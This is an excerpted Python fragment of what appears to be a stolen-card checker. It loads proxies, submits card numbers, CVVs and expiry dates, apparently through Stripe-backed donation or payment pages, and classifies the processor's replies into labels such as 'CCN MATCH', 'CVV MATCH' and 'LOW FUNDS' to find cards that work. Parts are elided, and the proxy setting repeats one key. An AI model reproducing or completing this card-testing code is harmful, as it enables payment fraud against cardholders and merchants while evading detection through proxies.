...
from rand_user import *

with open(".proxy.txt", "r") as filena:
    allText = filena.read()
...
def new_func(cc, cvv, mes, ano):
    ...
    r.proxies.update({"http": f"http://{proxies1}", "http": f"http://{proxies1}"})
    ...
    if not a:
        r_text, r_logo, r_respo = "Unknown Error", "❌", "Unknown"
    ...
    if "status" in last and "succeeded" in last["status"]:
        ...
        stripeMessage = (
            last["error"]["message"].replace("_", " ")
            if "message" in last["error"]
            else last["error"]["code"].replace("_", " ")
        )
        r_respo = (
            last["error"]["code"].replace("_", " ").title()
            if "code" in last["error"]
            else "Unknown"
        )
...
def get_response_mchk(text: str):
    if (
        "card was declined" in text
        or "card_declined" in text
        or "The transaction has been declined" in text
        or "Processor Declined" in text
    ):
        r_text, r_logo, r_respo = "DECLINED", "❌", "DECLINED"
    elif (
        "Your card number is incorrect" in text
        or "Call to a member function attach() on null" in text
    ):
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", "DECLINED"
    elif (
        "incorrect_zip" in text
        or "Your card zip code is incorrect." in text
        or "The zip code you supplied failed validation" in text
        or "card zip code is incorrect" in text
    ):
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", "CVV MATCH"
    elif (
        "card has insufficient funds" in text
        or "insufficient_funds" in text
        or "Insufficient Funds" in text
    ):
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", "CVV MATCH"
    elif (
        "incorrect_cvc" in text
        or "card's security code is incorrect" in text
        or "card&#039;s security code is incorrect" in text
        or "security code is invalid" in text
        or "CVC was incorrect" in text
        or "incorrect CVC" in text
        or "cvc was incorrect" in text
        or "Card Issuer Declined CVV" in text
        or "security code is incorrect" in text
    ):
        r_text, r_logo, r_respo = "CCN MATCH", "✅", "CCN Match"
    elif (
        "card does not support this type of purchase" in text
        or "transaction_not_allowed" in text
        or "Transaction Not Allowed" in text
    ):
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", "DECLINED"
    elif (
        "Customer authentication is required" in text
        or "unable to authenticate" in text
        or "three_d_secure_redirect" in text
        or "hooks.stripe.com/redirect/" in text
        or "requires an authorization" in text
        ...
        "Donation Confirmation" in text
        or "This page doesn't seem to exist" in text
        or 'seller_message": "Payment complete."' in text
        or '"cvc_check": "pass"' in text
        or "thank_you" in text
        or '"type":"one-time"' in text
